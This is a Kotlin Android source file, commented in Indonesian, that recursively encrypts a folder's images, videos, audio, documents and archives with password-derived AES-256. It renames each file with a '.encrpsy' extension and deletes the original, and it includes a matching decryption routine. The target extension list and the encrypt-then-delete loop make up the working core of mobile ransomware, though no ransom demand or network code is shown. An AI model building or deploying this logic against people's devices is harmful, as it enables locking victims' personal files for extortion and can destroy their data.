package com.sync.xxx

import android.content.Context
import android.os.Environment
import android.util.Log
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec
import java.security.SecureRandom

/**
 * FILE ENCRYPTION SERVICE - UPGRADED
 * 
 * Fitur:
 * - Enkripsi AES-256/CBC/PKCS5Padding
 * - Key derivation menggunakan PBKDF2WithHmacSHA256 (10000 iterasi)
 * - Salt dan IV random untuk setiap file
 * - Ekstensi output: .encrpsy
 * - Dekripsi otomatis hapus file .encrpsy
 */
object FileEncryptionService {

    private const val TAG = "FileEncryptionService"
    private const val ALGORITHM = "AES"
    private const val TRANSFORMATION = "AES/CBC/PKCS5Padding"
    private const val KEY_ALGORITHM = "PBKDF2WithHmacSHA256"
    private const val KEY_SIZE = 256
    private const val ITERATIONS = 10000
    private const val SALT_LENGTH = 16 // bytes
    private const val IV_LENGTH = 16   // bytes
    private const val ENCRYPTED_EXTENSION = ".encrpsy"

    // Target file extensions untuk enkripsi
    private val TARGET_EXTENSIONS = arrayOf(
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",  // Images
        ".mp4", ".avi", ".mkv", ".mov", ".flv", ".wmv",    // Videos
        ".mp3", ".wav", ".flac", ".aac", ".ogg", ".m4a",   // Audio
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", // Documents
        ".zip", ".rar", ".7z", ".tar", ".gz"               // Archives
    )

    /**
     * Enkripsi single file
     * @return true jika berhasil
     */
    fun encryptFile(
        inputFile: File,
        outputDir: File,
        password: String
    ): Boolean {
        return try {
            if (!inputFile.exists() || !inputFile.isFile) {
                Log.e(TAG, "Input file tidak valid: ${inputFile.absolutePath}")
                return false
            }

            // Generate random salt dan IV
            val salt = ByteArray(SALT_LENGTH)
            val iv = ByteArray(IV_LENGTH)
            SecureRandom().apply {
                nextBytes(salt)
                nextBytes(iv)
            }

            // Derive key dari password menggunakan PBKDF2
            val key = deriveKey(password, salt)
            val secretKey = SecretKeySpec(key, ALGORITHM)
            val ivSpec = IvParameterSpec(iv)

            // Setup cipher
            val cipher = Cipher.getInstance(TRANSFORMATION)
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec)

            // Output file dengan ekstensi .encrpsy
            val outputFile = File(outputDir, inputFile.name + ENCRYPTED_EXTENSION)

            FileOutputStream(outputFile).use { fos ->
                // Write salt (16 bytes) + IV (16 bytes) di awal file
                fos.write(salt)
                fos.write(iv)

                // Enkripsi dan write data
                FileInputStream(inputFile).use { fis ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (fis.read(buffer).also { bytesRead = it } != -1) {
                        val encryptedBytes = cipher.update(buffer, 0, bytesRead)
                        if (encryptedBytes != null) {
                            fos.write(encryptedBytes)
                        }
                    }
                    // Final block
                    val finalBytes = cipher.doFinal()
                    if (finalBytes != null) {
                        fos.write(finalBytes)
                    }
                }
            }

            // Hapus file original setelah enkripsi berhasil
            if (outputFile.exists() && outputFile.length() > 0) {
                inputFile.delete()
                Log.d(TAG, "Encrypted: ${inputFile.name} -> ${outputFile.name}")
                true
            } else {
                Log.e(TAG, "Enkripsi gagal: output file kosong")
                false
            }

        } catch (e: Exception) {
            Log.e(TAG, "encryptFile error: ${e.message}", e)
            false
        }
    }

    /**
     * Dekripsi single file
     * @return true jika berhasil
     */
    fun decryptFile(
        encryptedFile: File,
        outputDir: File,
        password: String
    ): Boolean {
        return try {
            if (!encryptedFile.exists() || !encryptedFile.name.endsWith(ENCRYPTED_EXTENSION)) {
                Log.e(TAG, "File bukan .encrpsy: ${encryptedFile.name}")
                return false
            }

            FileInputStream(encryptedFile).use { fis ->
                // Baca salt (16 bytes) dan IV (16 bytes) dari awal file
                val salt = ByteArray(SALT_LENGTH)
                val iv = ByteArray(IV_LENGTH)
                
                if (fis.read(salt) != SALT_LENGTH || fis.read(iv) != IV_LENGTH) {
                    Log.e(TAG, "File corrupt: salt/IV tidak lengkap")
                    return false
                }

                // Derive key dari password
                val key = deriveKey(password, salt)
                val secretKey = SecretKeySpec(key, ALGORITHM)
                val ivSpec = IvParameterSpec(iv)

                // Setup cipher
                val cipher = Cipher.getInstance(TRANSFORMATION)
                cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec)

                // Output file (hilangkan ekstensi .encrpsy)
                val originalName = encryptedFile.name.removeSuffix(ENCRYPTED_EXTENSION)
                val outputFile = File(outputDir, originalName)

                FileOutputStream(outputFile).use { fos ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (fis.read(buffer).also { bytesRead = it } != -1) {
                        val decryptedBytes = cipher.update(buffer, 0, bytesRead)
                        if (decryptedBytes != null) {
                            fos.write(decryptedBytes)
                        }
                    }
                    // Final block
                    val finalBytes = cipher.doFinal()
                    if (finalBytes != null) {
                        fos.write(finalBytes)
                    }
                }

                // Hapus file .encrpsy setelah dekripsi berhasil
                if (outputFile.exists() && outputFile.length() > 0) {
                    encryptedFile.delete()
                    Log.d(TAG, "Decrypted: ${encryptedFile.name} -> ${outputFile.name}")
                    true
                } else {
                    Log.e(TAG, "Dekripsi gagal: output file kosong")
                    outputFile.delete() // Cleanup failed output
                    false
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "decryptFile error: ${e.message}", e)
            false
        }
    }

    /**
     * Enkripsi semua file di folder
     */
    fun encryptFolder(
        folder: File,
        password: String,
        progressCallback: ((current: Int, total: Int, filename: String) -> Unit)? = null
    ): EncryptionResult {
        val filesToEncrypt = mutableListOf<File>()
        
        // Scan folder dan ambil semua file yang valid
        scanDirectory(folder, filesToEncrypt)

        var encryptedCount = 0
        val errors = mutableListOf<String>()
        val totalFiles = filesToEncrypt.size

        filesToEncrypt.forEachIndexed { index, file ->
            try {
                progressCallback?.invoke(index + 1, totalFiles, file.name)
                
                if (encryptFile(file, file.parentFile ?: folder, password)) {
                    encryptedCount++
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to encrypt ${file.name}: ${e.message}")
                errors.add("${file.name}: ${e.message}")
            }
        }

        return EncryptionResult(
            success = true,
            filesEncrypted = encryptedCount,
            totalFiles = totalFiles,
            errors = errors
        )
    }

    /**
     * Dekripsi semua file .encrpsy di folder
     */
    fun decryptFolder(
        folder: File,
        password: String,
        progressCallback: ((current: Int, total: Int, filename: String) -> Unit)? = null
    ): DecryptionResult {
        val filesToDecrypt = mutableListOf<File>()
        
        // Scan folder dan ambil semua file .encrpsy
        scanEncryptedFiles(folder, filesToDecrypt)

        var decryptedCount = 0
        val errors = mutableListOf<String>()
        val totalFiles = filesToDecrypt.size

        filesToDecrypt.forEachIndexed { index, file ->
            try {
                progressCallback?.invoke(index + 1, totalFiles, file.name)
                
                if (decryptFile(file, file.parentFile ?: folder, password)) {
                    decryptedCount++
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to decrypt ${file.name}: ${e.message}")
                errors.add("${file.name}: ${e.message}")
            }
        }

        return DecryptionResult(
            success = true,
            filesDecrypted = decryptedCount,
            totalFiles = totalFiles,
            errors = errors
        )
    }

    /**
     * Derive AES key dari password menggunakan PBKDF2
     */
    private fun deriveKey(password: String, salt: ByteArray): ByteArray {
        val spec = PBEKeySpec(password.toCharArray(), salt, ITERATIONS, KEY_SIZE)
        val factory = SecretKeyFactory.getInstance(KEY_ALGORITHM)
        return factory.generateSecret(spec).encoded
    }

    /**
     * Scan directory untuk file yang bisa dienkripsi
     */
    private fun scanDirectory(directory: File, fileList: MutableList<File>) {
        if (!directory.exists() || !directory.isDirectory) return

        directory.listFiles()?.forEach { file ->
            when {
                file.isFile && isTargetFile(file) && !file.name.endsWith(ENCRYPTED_EXTENSION) -> {
                    fileList.add(file)
                }
                file.isDirectory -> {
                    scanDirectory(file, fileList) // Recursive scan subdirectories
                }
            }
        }
    }

    /**
     * Scan directory untuk file .encrpsy
     */
    private fun scanEncryptedFiles(directory: File, fileList: MutableList<File>) {
        if (!directory.exists() || !directory.isDirectory) return

        directory.listFiles()?.forEach { file ->
            when {
                file.isFile && file.name.endsWith(ENCRYPTED_EXTENSION) -> {
                    fileList.add(file)
                }
                file.isDirectory -> {
                    scanEncryptedFiles(file, fileList) // Recursive
                }
            }
        }
    }

    /**
     * Cek apakah file termasuk target enkripsi
     */
    private fun isTargetFile(file: File): Boolean {
        val fileName = file.name.toLowerCase()
        return TARGET_EXTENSIONS.any { fileName.endsWith(it) }
    }

    /**
     * Get encryption status
     */
    fun getEncryptionStatus(folder: File): EncryptionStatus {
        val allFiles = mutableListOf<File>()
        val encryptedFiles = mutableListOf<File>()
        
        scanDirectory(folder, allFiles)
        scanEncryptedFiles(folder, encryptedFiles)

        return EncryptionStatus(
            totalFiles = allFiles.size,
            encryptedFiles = encryptedFiles.size,
            unencryptedFiles = allFiles.size
        )
    }
}

/**
 * Data class untuk hasil enkripsi
 */
data class EncryptionResult(
    val success: Boolean,
    val filesEncrypted: Int,
    val totalFiles: Int,
    val errors: List<String>
)

/**
 * Data class untuk hasil dekripsi
 */
data class DecryptionResult(
    val success: Boolean,
    val filesDecrypted: Int,
    val totalFiles: Int,
    val errors: List<String>
)

/**
 * Data class untuk status enkripsi
 */
data class EncryptionStatus(
    val totalFiles: Int,
    val encryptedFiles: Int,
    val unencryptedFiles: Int
)
